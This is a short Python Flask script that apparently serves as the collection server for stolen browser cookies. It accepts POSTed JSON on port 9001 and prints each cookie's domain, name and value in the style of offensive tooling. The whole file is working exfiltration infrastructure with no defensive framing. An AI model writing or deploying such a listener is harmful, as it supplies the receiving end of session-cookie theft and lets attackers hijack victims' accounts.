from flask import Flask, request

app = Flask(__name__)

@app.route("/", methods=["POST"])
def home():
    cookies = request.json
    if cookies is not None:
        for cookie in cookies:
            print(f"""
[+] Domain : {cookie['domain']} 
    Name   : {cookie['name']}
    Value  : {cookie['value']}""")
    else:
        print("[!] No JSON data received or invalid JSON.")

    return "OK"

app.run(port=9001)